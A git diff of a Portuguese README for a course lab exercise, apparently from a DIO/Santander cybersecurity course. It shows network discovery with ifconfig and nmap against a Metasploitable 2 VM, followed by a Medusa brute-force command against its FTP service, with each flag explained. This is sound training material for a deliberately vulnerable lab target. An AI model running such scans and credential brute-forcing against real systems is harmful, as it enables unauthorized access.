@@ -3,16 +3,24 @@ Desafio do Curso da DIO: Santander - Cibersegurança do Zero a prática, o qual 
 
 - Descobrindo o alvo:  
   
-1. ifconfig para descobrir a máscara da rede
-### input 
+## 1. ifconfig para descobrir a máscara da rede  
+input 
 ```bash
 ifconfig
-```  
-   -> inet 192.168.0.105  netmask 255.255.255.0  
+```
+observado
+```text
+inet 192.168.0.105  netmask 255.255.255.0
+```
   
-3. uso da ferramenta nmap para descobrir os dispositivos na rede local, encontrando a maquina virtual do Metasploitable 2 e quais portas estão abertas  
-   [] nmap -v  
-   -> Nmap scan report for 192.168.0.1  
+## 2. uso da ferramenta nmap para descobrir os dispositivos na rede local, encontrando a maquina virtual do Metasploitable 2 e quais portas estão abertas  
+input
+```bash
+nmap -v
+```
+output
+```text
+  Nmap scan report for 192.168.0.1  
 Host is up (0.0014s latency).  
 Not shown: 997 closed tcp ports (reset)  
 PORT     STATE SERVICE  
@@ -48,13 +56,22 @@ PORT     STATE SERVICE
 6667/tcp open  irc  
 8009/tcp open  ajp13  
 8180/tcp open  unknown  
-MAC (ocultado por privacidade) (Oracle VirtualBox virtual NIC)  
+MAC (ocultado por privacidade) (Oracle VirtualBox virtual NIC)
+```  
 
-Com isso, o ip do alvo é 192.168.0.155 e sei que as portas para os ataques (21 - ftp) estão abertas  
+- Com isso, o ip do alvo é 192.168.0.155 e sei que as portas para os ataques (21 - ftp) estão abertas  
 
-- Brute force em FTP com Medusa  
-Os arquivos de users e senhas são simples apenas para a demonstração  
-1. Explicando o comando  
-   medusa -h (ip alvo) -U (arquivo com usuários) -P (arquivo com senhas) -M (protocolo / porta a atacar) -t (numero de threads ao mesmo tempo)  
-2. [] medusa -h 192.168.0.155 -U users.txt -P pass.txt -M ftp -t 6  
+- Brute force em FTP com Medusa
+   
+Os arquivos de users e senhas são simples apenas para a demonstração
+
+## 1. Explicando o comando  
+```text
+medusa -h (ip alvo) -U (arquivo com usuários) -P (arquivo com senhas) -M (protocolo / porta a atacar) -t (numero de threads ao mesmo tempo)  
+```
+
+## 2. Rodando o comando, o aplicativo tentará usar cada combinação usuario-senha para encontrar a correta
+```bash
+medusa -h 192.168.0.155 -U [users.txt](./users.txt). -P [pass.txt](./pass.txt). -M ftp -t 6
+```  
 
